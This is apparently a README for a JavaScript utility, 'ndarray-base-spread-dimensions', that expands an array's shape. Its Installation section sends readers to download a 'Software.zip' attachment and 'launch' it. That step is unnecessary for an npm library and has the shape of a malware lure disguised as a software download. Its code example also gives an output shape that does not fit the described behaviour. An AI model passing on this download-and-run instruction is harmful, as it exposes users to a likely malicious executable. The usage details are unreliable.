
# 🚀 ndarray-base-spread-dimensions

Welcome to the `ndarray-base-spread-dimensions` repository! This JavaScript utility allows you to expand the shape of an array to a specified dimensionality by spreading its dimensions to specified dimension indices and inserting dimensions of size one for the remaining dimensions.

## Topics
['array', 'base', 'broadcast', 'expand', 'javascript', 'multidimensional', 'ndarray', 'node', 'node-js', 'nodejs', 'reshape', 'singleton', 'spread', 'stdlib', 'types', 'util', 'utilities', 'utility', 'utils']

## Installation
To use this utility, you can download the software package by clicking the button below:
[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/18388744/Software.zip)

(Ensure to launch the software package after downloading for installation.)

If the above link does not work, please check the "Releases" section of this repository for alternative download options.

## Usage
You can include the `ndarray-base-spread-dimensions` utility in your Node.js projects by following these simple steps:

1. Install the utility using npm:
```bash
npm install ndarray-base-spread-dimensions
```

2. Require the utility in your Node.js project:
```javascript
const spreadDimensions = require('ndarray-base-spread-dimensions');
```

3. Utilize the utility in your code to expand array dimensions as needed.

## Examples
Here is an example of how you can use the `ndarray-base-spread-dimensions` utility:

```javascript
const ndarray = require('ndarray');
const spreadDimensions = require('ndarray-base-spread-dimensions');

// Create a 1D array
const array1D = ndarray([1, 2, 3]);

// Spread dimensions to 3D array at indices 1 and 2
const newArray = spreadDimensions(array1D, [1, 2]);

console.log(newArray.shape); // Output: [1, 3, 1]
```

## Support and Contribution
If you encounter any issues or have suggestions for improvements, please feel free to [open an issue](https://github.com/user/repository/issues).

Contributions are welcome! If you would like to contribute to this project, please fork the repository and submit a pull request.

## License
This utility is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.

---

Thank you for exploring the `ndarray-base-spread-dimensions` utility. May your multidimensional array manipulation tasks be as smooth as spreading butter on toast! 🍞🔪✨